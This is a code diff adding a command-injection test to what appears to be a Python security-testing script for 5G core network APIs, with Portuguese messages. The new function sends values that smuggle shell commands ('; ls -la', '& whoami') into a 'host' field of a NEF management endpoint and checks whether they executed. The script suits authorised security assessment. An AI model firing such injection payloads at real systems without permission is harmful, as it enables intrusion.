@@ -38,3 +38,25 @@ def test_sql_injection():
             print("[+] SQL Injection (Boolean-based) não detectada.")
     except requests.exceptions.RequestException as e:
         print(f"[-] Erro ao testar SQLi: {e}")
+
+def test_command_injection():
+    print("\n" + "=" * 50)
+    print("A1: Testando Command Injection em APIs (SBA)")
+    print("=" * 50)
+    nf_mgmt_url = f"http://{NF_CONFIG['NEF_IP']}:{NF_CONFIG['NEF_PORT']}/management/ping"
+    target_cmd_param = "host"
+    headers = {"Content-Type": "application/json"}
+    commands = ["; ls -la", "& whoami"]
+
+    for cmd in commands:
+        try:
+            response = requests.post(nf_mgmt_url, headers=headers, data=json.dumps({target_cmd_param: f"127.0.0.1{cmd}"}), timeout=5)
+            if "total" in response.text or "uid=" in response.text:
+                print(f"[!!!] Command Injection detectada! Comando '{cmd}' funcionou.")
+                return
+        except requests.exceptions.RequestException:
+            pass
+
+if __name__ == "__main__":
+    test_sql_injection()
+    test_command_injection()
